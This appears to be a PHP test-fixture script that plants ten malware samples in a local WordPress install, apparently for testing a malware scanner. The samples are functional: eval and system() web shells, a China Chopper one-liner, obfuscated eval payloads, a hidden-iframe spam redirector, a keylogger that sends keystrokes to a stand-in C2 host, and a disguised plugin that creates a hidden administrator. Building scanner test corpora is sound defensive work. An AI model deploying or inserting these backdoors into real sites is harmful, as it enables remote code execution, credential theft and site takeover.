<?php
$base = 'C:/xampp/htdocs/mahabub/';

$threats = [
    // 1. Multi-Stage Eval Base64 WebShell
    'wp-content/uploads/shell_eval_b64.php' => '<?php
// Threat 1: Multi-Stage Evaluator WebShell
$auth_pass = $_POST["pass"] ?? "";
$input_source = $_POST["mdf_eval_param"] ?? "";
if (!empty($input_source)) {
    $stage1 = base64_decode($input_source);
    eval($stage1);
}
?>',

    // 2. System Command / RCE Backdoor
    'wp-content/plugins/rce_backdoor.php' => '<?php
/*
Plugin Name: System Helper Tool
Description: Suspicious command execution utility.
*/
if (isset($_GET["cmd"])) {
    system($_GET["cmd"]);
    passthru($_GET["cmd"]);
    shell_exec($_GET["cmd"]);
}
?>',

    // 3. Dynamic Dispatcher One-Liner Backdoor
    'wp-content/uploads/china_chopper.php' => '<?php
$in = $_POST["mdefender_test"] ?? "";
if ($in) {
    assert($in);
}
?>',

    // 4. Highly Obfuscated Gzinflate + Str_Rot13 WebShell
    'wp-content/uploads/obfuscated_trojan.php' => '<?php
$payload = "XZJBCoMwEEX3gu8wwZ2Wgljpxn0UqZNWkhiTIhZ698ZEpbt5/3+P+WjI3rEwN+h9v517RjQeMkJcM4T6zGgYgA==";
eval(gzinflate(base64_decode(str_rot13($payload))));
?>',

    // 5. Dynamic Variable Function Execution
    'wp-content/uploads/var_func_call.php' => '<?php
$a = $_REQUEST["a"];
$b = $_REQUEST["b"];
$func = $a;
$func($b);
?>',

    // 6. Malicious SEO Spam & Hidden Iframe Injector
    'wp-content/uploads/seo_spam_redirect.php' => '<?php
// Threat 6: SEO Pharma / Casino Spam & Malicious Traffic Redirect
echo "<div style=\"display:none;position:absolute;top:-9999px;\"><a href=\"http://spam-casino-online-win.xyz/rx\">Cheap Meds Casino</a></div>";
if (strpos($_SERVER["HTTP_USER_AGENT"], "Googlebot") === false) {
    header("Location: https://malicious-scam-redirect.xyz/landing?aff=8492");
    echo "<script>window.location.href=\"https://malicious-scam-redirect.xyz/landing\";</script>";
}
?>',

    // 7. Malicious JavaScript WebMiner / Keylogger
    'wp-content/uploads/crypto_miner.js' => '// Threat 7: In-Browser Cryptominer & Keylogger Backdoor
var webminer = new cryptoloot.Anonymous("SITE_KEY_TEST", {threads: 4});
document.addEventListener("keypress", function(e) {
    fetch("http://c2-collector-test.xyz/keys?k=" + encodeURIComponent(e.key));
});',

    // 8. Public Exposure: Sensitive Environment Config File
    'wp-content/uploads/.env.backup' => 'DB_HOST=localhost
DB_DATABASE=mahabub_shop_db
DB_USERNAME=root
DB_PASSWORD=SuperSecretRootPassword2026!
AWS_SECRET_ACCESS_KEY=AKIAIOSFODNN7EXAMPLESECRETKEY
JWT_SECRET=super_secret_jwt_signing_key_1234567890
',

    // 9. Unauthorized Admin Creation Backdoor Script
    'wp-content/plugins/create_backdoor_admin.php' => '<?php
/*
Plugin Name: Cache Optimizer Pro
Description: Creates hidden privileged administrator.
*/
require_once dirname(dirname(dirname(__FILE__))) . "/wp-load.php";
if (isset($_GET["make_admin"])) {
    $user_id = wp_create_user("shadow_admin", "HackedPassword999!", "shadow@evil-hacker.com");
    $user = new WP_User($user_id);
    $user->set_role("administrator");
    echo "Admin created!";
}
?>',

    // 10. Chr() Concatenation Hex String Obfuscation
    'wp-content/uploads/chr_hex_webshell.php' => '<?php
$str = chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);
$payload = chr(119).chr(104).chr(111).chr(97).chr(109).chr(105);
$str($payload);
?>'
];

echo "=== PLANTING REALISTIC TEST THREATS IN MAHABUB SITE ===\n";
foreach ($threats as $rel_path => $content) {
    $full = $base . $rel_path;
    $dir = dirname($full);
    if (!is_dir($dir)) {
        @mkdir($dir, 0755, true);
    }
    file_put_contents($full, $content);
    echo " [+] Planted Threat: $rel_path (" . strlen($content) . " bytes)\n";
}
echo "=== 10 Diverse Threat Samples Planted Successfully ===\n";
